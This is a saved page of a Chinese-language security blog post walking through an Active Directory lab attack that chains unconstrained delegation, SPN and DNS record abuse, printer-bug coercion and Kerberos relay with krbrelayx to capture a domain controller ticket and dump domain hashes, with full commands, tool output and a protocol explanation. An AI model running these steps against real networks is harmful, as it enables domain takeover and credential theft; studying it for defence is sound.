@@ -1,0 +1,147 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 非约束委派 + Kerberos中继 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="非约束委派 + Kerberos中继 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">非约束委派 + Kerberos中继</h1><div class="post-time">Nov 30, 2021</div><div class="post-content"><h3><span id="0x00-前言">0x00 前言</span></h3><p>本文将从两个场景阐述【非约束委派 + Kerberos 中继】的组合使用。</p>
+<p>两个场景中，攻击机均在域外（同内网）</p>
+<h3><span id="0x01-实战场景一拥有已设置非约束委派的主机的本地管理员账号密码">0x01 实战场景一：拥有已设置非约束委派的主机的本地管理员账号密码</span></h3><p>第一个场景：当我们拥有一个域内已设置非约束委派的 Windows 10 主机的本地管理员组的账号密码（假设是 adminsitrator），且因为该主机上存在一些杀软或其他设备导致无法远程登陆（3389、PsExec等远程登陆）到目标机器进行常规的非约束委派攻击。</p>
+<p>本章节就以此为背景，讲述如何进行突破。下表是测试环境介绍：</p>
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>机器名</th>
+<th>ip</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>域控</td>
+<td>dc.test.local</td>
+<td>192.168.247.8</td>
+</tr>
+<tr>
+<td>域内win10（已控）</td>
+<td>win10.test.local</td>
+<td>192.168.247.10</td>
+</tr>
+<tr>
+<td>Kali Linux（攻击机）</td>
+<td>PWNED</td>
+<td>192.168.247.145</td>
+</tr>
+</tbody>
+</table>
+<p>#### </p>
+<h4><span id="11dump-远程机器lsa">1.1.Dump 远程机器LSA</span></h4><p>首先我们需要 dump 目标机器上的机器账号的 AES256 密文和 NTLM 哈希值，为下一步做准备。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ python3 secretsdump.py administrator:Password1@192.168.247.10</span><br><span class="line">Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xae45437a8b95c0eea4b4596158c2d68c</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="built_in">test</span>:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">TEST.LOCAL/aduser:<span class="variable">$DCC2</span><span class="variable">$10240</span><span class="comment">#aduser#8addbc364aec2e91d4747bfb22334612</span></span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC </span><br><span class="line">TEST\WIN10$:aes256-cts-hmac-sha1-96:01c5ab651c87d3e519d0e68236adc0cbc63b493519895efe2cd1939e212696db</span><br><span class="line">TEST\WIN10$:aes128-cts-hmac-sha1-96:21177ecb02e30e940b7f61c0f990bd53</span><br><span class="line">TEST\WIN10$:des-cbc-md5:9ecb207f9da8294a</span><br><span class="line">TEST\WIN10$:plain_password_hex:a39afbc2b71fa35da2c18298d693049e64e0be3267a52e7078d02bed143f99ea8c12e58026e571bcf3696074a72b8d1f032ae1a7126ddfa7028cb859495c3939cae24a5cea26a13b293f65c696dd9a8e242d02d0fa087c73982613ec28d91e8e1936ec26cad5ed24f5f2cd9edac9b1da5996d096cbeb2fdc245d0d1c9fba19be4cc79c20806660a6efa9d66673cf5fd77ca23e52c5ddac27297086ea8acf2b6ca11c067c73290bfbf48e1a08577c0f2a84b12122fc0221d5fb42ed4ca00d9418a7418a122858ecfcac7b06430c8e853512bbbf1303b466aba0510e7946d4c1665a8453d9200249e299cb143e32fe2175</span><br><span class="line">TEST\WIN10$:aad3b435b51404eeaad3b435b51404ee:e8651b47207d6607cae4de554356ebb0:::</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x3a0621afad92277fc0d478f02a64049dcc3fc04d</span><br><span class="line">dpapi_userkey:0x320de78175e986e0d25c6ac011c60dfa797ff571</span><br><span class="line">[*] NL<span class="variable">$KM</span> </span><br><span class="line"> 0000   10 30 50 6C 7C 06 4E C8  DB F8 41 5B 21 C9 53 54   .0Pl|.N...A[!.ST</span><br><span class="line"> 0010   1A 31 E8 0A 15 03 32 F1  8C 32 1E CB 36 6B 19 3A   .1....2..2..6k.:</span><br><span class="line"> 0020   C7 8A 68 BA 22 82 9B 01  2A 36 43 16 39 E3 CB 11   ..h.<span class="string">"...*6C.9...</span></span><br><span class="line"><span class="string"> 0030   5B FB 13 DD 5F E4 9C 79  66 B6 B7 C1 18 89 9D 65   [..._..yf......e</span></span><br><span class="line"><span class="string">NL<span class="variable">$KM</span>:1030506c7c064ec8dbf8415b21c953541a31e80a150332f18c321ecb366b193ac78a68ba22829b012a36431639e3cb115bfb13dd5fe49c7966b6b7c118899d65</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br><span class="line"><span class="string">[*] Restoring the disabled state for service RemoteRegistry</span></span><br></pre></td></tr></table></figure>
+<p>如下图所示：</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630574988110-57ddc1ad-ee9c-401e-bb07-f64f6478817e.png" alt="img"></p>
+<p>那么这里提个问题：为什么需要机器账号的 AES256 密文和 NTLM 哈希值呢？往下看，下面有解释。</p>
+<h4><span id="12域内机器的-system-权限">1.2.域内机器的 System 权限</span></h4><p>在域内机器中的 System 权限可以在域内充当机器账号。详细参考：</p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/10#1-ji-qi-yong-hu-gen-system-yong-hu-de-guan-xi" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ldap-pian/10#1-ji-qi-yong-hu-gen-system-yong-hu-de-guan-xi</a></p>
+<p>如下实验：我们在 Win10（192.168.247.10）主机中，使用本地管理员 administrator 账号执行 <code>**setspn -q \*/\***</code> 命令，用于查询域内 SPN 记录，可以看到出现报错信息。但如果我们利用诸如 psexec 将当前权限提升至 system，再执行相同的命令，可以看到可以跟域控正常通信并获取 SPN 记录。这是因为在域内机器中，System 权限相当于域机器账号，可与域控正常通信（可用于域内信息收集）。</p>
+<p>如下图，红框部分是 WIND10$ 机器账号注册的 SPN：</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575087549-c277ce6d-daff-4367-a994-a908e7059fb3.png" alt="img"></p>
+<h4><span id="13添加-spn">1.3.添加 SPN</span></h4><p>我们尝试用一下项目中的 <strong>addspn.py</strong> 对该机器账户进行添加 SPN 操作。</p>
+<p><a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noopener">https://github.com/dirkjanm/krbrelayx</a></p>
+<p>上面已经对该机器账号进行了 SPN 查询，那么接下来尝试对该机器账号添加一条 SPN：<strong>HOST/PWNED.test.local</strong>，如果发现发现没有权限添加，那么该脚本会提示我们使用 <strong>–additional</strong> 参数对该机器账号的 <strong>msDS-AdditionalDnsHostName</strong> 属性进行修改。</p>
+<p>这是为什么呢？这是因为在默认情况下，机器账号拥有可设置自身 <strong>msDS-AdditionalDnsHostName</strong> 属性的权限，并且可将该属性设置为任意主机名（包括不存在的主机）。所以本章节中，我们利用这个特性，为机器账号注册（添加）一个新的 SPN 记录： <strong>HOST/PWNED.test.local ，</strong>指向攻击机。</p>
+<p>如下操作（机器账号的 NTLM 作用在此）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询当前机器账号的 SPN 记录</span></span><br><span class="line">$ python3 addspn.py -u TEST\\WIN10$ -p aad3b435b51404eeaad3b435b51404ee:e8651b47207d6607cae4de554356ebb0 -s HOST/PWNED.test.local -q dc.test.local</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] Found modification target</span><br><span class="line">DN: CN=WIN10,CN=Computers,DC=<span class="built_in">test</span>,DC=<span class="built_in">local</span> - STATUS: Read - READ TIME: 2021-08-31T04:58:33.868515</span><br><span class="line">    dNSHostName: WIN10.test.local</span><br><span class="line">    sAMAccountName: WIN10$</span><br><span class="line">    servicePrincipalName: RestrictedKrbHost/WIN10</span><br><span class="line">                          HOST/WIN10</span><br><span class="line">                          RestrictedKrbHost/WIN10.test.local</span><br><span class="line">                          HOST/WIN10.test.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试添加 SPN 记录，提示无权限，并建议使用 --additiona 对 msDS-AdditionalDnsHostName 进行修改</span></span><br><span class="line">$ python3 addspn.py -u TEST\\WIN10$ -p aad3b435b51404eeaad3b435b51404ee:e8651b47207d6607cae4de554356ebb0 -s HOST/PWNED.test.local dc.test.local  </span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] Found modification target</span><br><span class="line">[!] Could not modify object, the server reports a constrained violation</span><br><span class="line">[!] You either supplied a malformed SPN, or you <span class="keyword">do</span> not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)</span><br><span class="line">[!] To add any SPN <span class="keyword">in</span> the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute</span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功修改 msDS-AdditionalDnsHostName</span></span><br><span class="line">$ python3 addspn.py -u TEST\\WIN10$ -p aad3b435b51404eeaad3b435b51404ee:e8651b47207d6607cae4de554356ebb0 -s HOST/PWNED.test.local dc.test.local --additional</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] Found modification target</span><br><span class="line">[+] SPN Modified successfully</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575153769-bc7083d4-63f1-40e2-9c6e-b84d69c2c39f.png" alt="img"></p>
+<p>在修改 <strong>msDS-AdditionalDnsHostName</strong>属性后，重新查询，可发现该机器账号下的 SPN 多了一条 <strong>HOST/PWNED.test.local</strong> 记录。这样我们注册spn的目的就达到了。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575225083-7763af4b-ebf9-4c4b-a118-1e176a15241c.png" alt="img"></p>
+<h4><span id="14添加-dns-指向">1.4.添加 DNS 指向</span></h4><p>利用上述 krbrelayx 项目中的 <strong>dnstool.py</strong> 脚本，向 DNS 服务器添加一个 A 记录（域内用户默认拥有向 DNS 服务器添加 A 记录的权限）。将  <strong>PWNED.test.local</strong> 解析到 kali（192.168.247.145） 攻击机。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 dnstool.py -u TEST\\WIN10$ -p aad3b435b51404eeaad3b435b51404ee:e8651b47207d6607cae4de554356ebb0 -r PWNED.test.local -d 192.168.247.145 --action add dc.test.local</span><br></pre></td></tr></table></figure>
+<p>命令执行后，等待一会儿，使用如下命令进行查询，就可以看到已成功解析。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575246318-2432944e-1b72-40f7-b5d9-d5349c3c8e2a.png" alt="img"></p>
+<h4><span id="15kerberos-中继">1.5.Kerberos 中继</span></h4><p>在 Kali 攻击机上运行 krbrelayx.py 脚本，启动一个监听程序。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 krbrelayx.py -aesKey 01c5ab651c87d3e519d0e68236adc0cbc63b493519895efe2cd1939e212696db</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575274021-b3d66f71-47b1-4cc0-919e-e4fd71827d3d.png" alt="img"></p>
+<p>这里为什么是用的 aesKey 呢？这就不得不提这个 AES256 密文是怎么来的了（见答疑部分）。</p>
+<h4><span id="16触发打印机漏洞">1.6.触发打印机漏洞</span></h4><p>最后利用打印机漏洞让域控对我们注册的恶意 SPN 服务主机 <strong>PWNED.test.local</strong> 进行身份认证。此时监听上就可以获取到域控的票据了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py -hashes aad3b435b51404eeaad3b435b51404ee:e8651b47207d6607cae4de554356ebb0 test.local/WIN10\<span class="variable">$@dc</span>.test.local PWNED.test.local</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575280393-3e388396-1d36-45c1-a36d-65aadad8d922.png" alt="img"></p>
+<p>导入票据，导出 NTLM 哈希值。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630575287603-fa293c29-4a1e-4353-adc6-ee3b1b279859.png" alt="img"></p>
+<h3><span id="0x02-实战场景二拥有已设置非约束委派的服务账号的账号密码">0x02 实战场景二：拥有已设置非约束委派的服务账号的账号密码</span></h3><h4><span id="21为域用户配置-spn">2.1.为域用户配置 SPN</span></h4><p>默认情况下，域账号不能设置委派，只有服务账号才能设置委派（非服务账号在用户属性中缺少【委派】选项卡）。</p>
+<p>我们可以给一个域用户注册一个 SPN（此操作需要在域控上操作），将其变成服务账号，这样就可以对其进行委派设置。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A test/test testuser</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584816346-157dd696-f81c-4eb1-bd94-b67ffbb998ab.png" alt="img"></p>
+<h4><span id="22添加-spn">2.2.添加 SPN</span></h4><p>假设我们在域外拿到了一个已设置了非约束委派的服务账号密码，并且该账号可以给自己的账户注册 SPN（拥有读取和写入SPN的权限）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u test.local\\testuser -p Password1 -s host/PWNED.test.local ldap://dc.test.local</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584822337-16e1f269-fc28-4673-85b9-b5cfb806fc24.png" alt="img"></p>
+<p>默认情况下，可能没有注册 SPN 的权限。需要手动在域控上给该服务账号设置权限（实战场景中，设置了非约束委派的服务账号是否存在该权限，情况不明）。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584828218-fa349d7d-535f-4901-859b-7a09c52d309e.png" alt="img"></p>
+<p>手动加上权限后，我们就可以给自己的服务账号下注册一个指向我们控制的机器的 SPN 了。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584833168-3e88391b-0899-411b-be30-fa7b9a1fd86b.png" alt="img"></p>
+<h4><span id="23添加-dns-指向">2.3.添加 DNS 指向</span></h4><p>同样利用域账号在域外向域控 DNS 加入 A 记录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u test.local\\testuser -p Password1 -r PWNED.test.local -d 192.168.247.145 --action add dc.test.local</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584838234-c0ea8773-6f42-40db-9d0d-446fad4fe363.png" alt="img"></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584843885-87d2a8fe-1264-43bc-ac9b-ff099c06d6ed.png" alt="img"></p>
+<h4><span id="24-kerberos-中继-触发打印机">2.4 Kerberos 中继 + 触发打印机</span></h4><p> krbrelayx.py 启动监听，打印机漏洞触发 DC 到恶意注册的 SPN 服务主机 <strong>PWNED.test.local</strong> 进行身份认证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 krbrelayx.py --krbsalt TEST.testuser --krbpass Password1</span><br><span class="line">python3 printerbug.py TEST.LOCAL/testuser:Password1@dc.test.local PWNED.test.local</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584865600-ef6bae38-0d09-46ea-8e88-39c63c74c130.png" alt="img"></p>
+<p>得到票据，导入票据。进行进一步操作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/path/to/ticket.ccache</span><br><span class="line">python3 secretsdump.py -k dc.test.local -just-dc</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630584870307-81852d2e-2da9-4564-88da-e42abd72afad.png" alt="img"></p>
+<h3><span id="0x03-相关技术细节">0x03 相关技术细节</span></h3><h4><span id="31-kerberos加密方式">3.1 Kerberos加密方式</span></h4><p>Kerberos 的加密方式可以在域控的「本地安全策略」中进行设置：</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630662100528-463524e8-bf77-47c0-b804-aee510d82b7d.png" alt="img"></p>
+<p>AD 支持的最弱加密方式是 RC4，他是没有用 salt 值进行加密。但是默认情况下 Kerberos 密钥使用的 AES-128 和 AES-256 进行加密，它是包含了 salt 值。</p>
+<ol>
+<li><ol>
+<li>对于用户账号，他的格式是大写的域名+区分大小写的用户名，例如：TEST.LOCALTestUser</li>
+</ol>
+</li>
+</ol>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630665768387-010818f1-bfc6-4779-aff4-921a1f51c3ae.png" alt="img"></p>
+<ol>
+<li><ol>
+<li>对于机器账号，他是大写的域名+host+完整的小写主机名，例如：TEST.LOCALhostwin10.test.local</li>
+</ol>
+</li>
+</ol>
+<p>​            <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630665758278-7821eb7b-b9c2-4616-8169-44ca72663e1e.png" alt="img"></p>
+<p>同样在我们获取到了明文密码和 salt 时候，可以用加密得到 AES-256 密文。如服务账号场景下，我们用到的命令是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 krbrelayx.py --krbsalt TEST.testuser --krbpass Password1</span><br></pre></td></tr></table></figure>
+<p>krbrelayx.py 会自动去计算 AES-256 密文。</p>
+<h4><span id="32-非约束委派流程">3.2 非约束委派流程</span></h4><p>当我们执行 printerbug.py 的时候，我们在攻击机 kali 上会接收到一个 AP_REP 的包，它是在一个 SMB 的包里被 GSS-API 和 SPNEGO 协议都用于封装的，可以看到他 Ticket 里的 SPN 为我们添加的恶意 SPN。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630898452970-b065e397-7f71-40a6-b4cc-aaed8e3c3805.png" alt="img"></p>
+<p>那为什么我们在 kali 上面只抓到一个 AP_REP 请求呢，AS 过程、TGS 过程和 AP_REQ 过程去哪里了呢？带着这个疑问往下走：</p>
+<ul>
+<li>AP_REQ 过程，因为我们的 kali 无法正常的像域内机器一样响应这个 AP_REP，同时我们也没有启动 krbrelayx.py 来做一个监听处理。</li>
+<li>AS 和 TGS 过程，是因为我们打印机漏洞是对域控的机器账户即 <strong>DC$</strong> 触发他对我们添加的恶意 SPN 主机 <strong>PWNED</strong> 身份认证。AS 和 TGS 的过程是客户端跟 <strong>KDC（</strong>Key Distribution Center）进行通信的，这里的 KDC 就是域控。所以我们在攻击机上是抓不到 AS 和 TGS 过程的。</li>
+</ul>
+<p>如下图，是一个完整的 kerberos认证过程（委派情况下）。<img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630914935688-79ea8643-8959-4260-a8f2-5b9db17e9391.png" alt="img"></p>
+<p>192.168.247.110 为域内一台普通主机，我使用域管登录。然后在上面执行 <strong>dir \192.168.247.10\c$</strong> 命令，可以看到一个完整的kerberos认证过程，其中192.168.247.8为域控，192.168.247.10 被设置了非约束委派。</p>
+<p>在第一个 AS_REP 中，我们可以看到加密 Kerberos 密钥用到的 salt。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630915281251-d0cdc46a-035e-423c-9071-21814a9176fc.png" alt="img"></p>
+<p>在第一个 TGS_REQ 里，有我们请求的服务 cifs\win10.test.local。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630915529350-d6ff9fb0-b585-4a8a-9a7b-760b10c23176.png" alt="img"></p>
+<p>第二个 TGS_REQ 里，请求的 krbtgt/test.local 的SPN，而且它有个 forwared 的标志，这个标志就代表这个 TGT 能用来进行委派。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630915741377-429ea143-aa36-4653-9ea7-0c7f9cb789e3.png" alt="img"></p>
+<p>在 Windows 下可以利用 klist 命令查看当前会话的票据信息，其中可以看到客户端，服务端，kerberos 票证的加密类型，票证的标志，有效期，其中被设置了委派的票据是含有 <strong>ok_as_delegate</strong> 的字样的。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630920646208-1e3f8627-5ed5-4488-9e56-acd3b50ba2c4.png" alt="img"></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630920652116-29304213-6b02-4999-9537-f336583011c7.png" alt="img"></p>
+<p>前面的 AS 和 TGS 都是客户端（192.168.247.110）跟 KDC（192.168.247.8）进行通信的过程，最后的 AP 过程就是客户端（192.168.247.110）跟服务（192.168.247.10）进行通信的过程，其中 AP_REQ 是含有 TGS 获取获取到的 TGS 票据的，然后AP_REP 过程中，服务（192.168.247.10）会使用自己的 hash 解密 TGS 票据。判断客户端（192.168.247.110）是否有访问服务（192.168.247.10）的权限。有从而完整的完成了一次 Kerberos 协议的流程。</p>
+<h4><span id="33-krbrelayx作用">3.3 krbrelayx作用</span></h4><p>在 AP_REQ 中，我们可以看到 Ticket 信息和 authenticator 信息。</p>
+<ul>
+<li>ticket 是通过服务的密码进行加密，他包含了用户的认证信息和会话密钥(session key)。它也可以用来进行认证，因为他包含一个用户所属组的 PAC。</li>
+<li>authenticator 是用会话密钥(session key）加密的结构。 用来证明客户端拥有此密钥并用于对客户端进行身份验证</li>
+</ul>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630917052945-8e9cae2a-5c63-4176-b3e1-9525646f4341.png" alt="img"></p>
+<p>同时一个含有委派 TGT 的 AP_REQ 和不含有委派 TGT 的 AP_REQ，他的数据包大小是不一样的，含有的数据包会很大。如下图，上部分是委派情况下的，下面是正常情况下的。AP_REQ 数据包大小是不一样的，另外还会多出一个 TGS 的过程。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630918128013-7e8c3473-2e65-4995-8816-24d96e47bd3b.png" alt="img"></p>
+<p>利用计算的好的 kerberos 密钥，即 AES256 密文是可以解密 AP_REQ 中的 Ticket 的，通过修改 krbrelayx.py 输出解密后的结构体：</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630918888891-439605fb-7d38-49ff-ac5d-c631e447b8b9.png" alt="img"></p>
+<p>其中包含 Ticket的有效期，Ticket 的用户名，还有授权信息（其中包含用户PAC）和会话密钥（session key）。</p>
+<p>然后用 session key 可以来解密 authenticator。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630919179216-e1b81d9c-48d7-494f-8d1e-dbf56d156cd3.png" alt="img"></p>
+<p>解密后除了跟上面一样的信息，多出了一个 checksum，在这个字段里就包含了委派 TGT 的 KRB_CRED 结构体。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630919488664-36e54dd6-3ea9-4952-a533-a3c942187fe7.png" alt="img"></p>
+<p>然后脚本会进行最后一步解密 enc-part 部分，这个部分包含与委托的 TGT 关联的会话密钥，我们需要在 DC 请求服务票证，解密后就会保存为ccache的格式。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630919987105-e4ae5e22-bcee-45ca-91bc-e05ad609df8d.png" alt="img"></p>
+<p>这样我们就获取到了第二个 TGS_REQ 中看到的请求的 krbtgt/test.local 的SPN，且拥有 forwared 标志，可以用来委派的 TGT。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1630919649943-dbb431c1-5712-428e-80cc-e07f0536c949.png" alt="img"></p>
+<h3><span id="0x04-答疑">0x04 答疑</span></h3><h4><span id="41为什么要添加-spn">4.1.为什么要添加 SPN</span></h4><p>服务主体名称（SPN: Service Principal Names）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service class&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;</span><br><span class="line">服务类型/对应机器名:服务端口[默认端口可不写]</span><br><span class="line">MSSQLSvc/SQLServer.rcoil.me:1433</span><br></pre></td></tr></table></figure>
+<p>由上面的技术细节，我们也了解到了kerberos的认证过程是跟SPN紧密相关的，我们想让域控对我们的控制的主机通过SMB协议进行身份认证成功，就必须注册正确的SPN。确保通过打印机漏洞触发无约束委派对账户进行身份认证且我们可以正常的解密票证。</p>
+<h4><span id="42为什么要用-aes256-密文">4.2.为什么要用 AES256 密文</span></h4><p>由上面的技术细节，可以知道 AES256 是用来加解密 Kerberos 票证的，我们在知道主机的密码和 SALT 的情况下是可以正常的解密 Kerberos 票证，最后得到一个具有委派标志的 TGT。</p>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/cobaltstrike模块功能修改过360核晶.html" class="prev">上一篇</a><a href="/posts/notes/基于资源的约束委派.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2024 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = 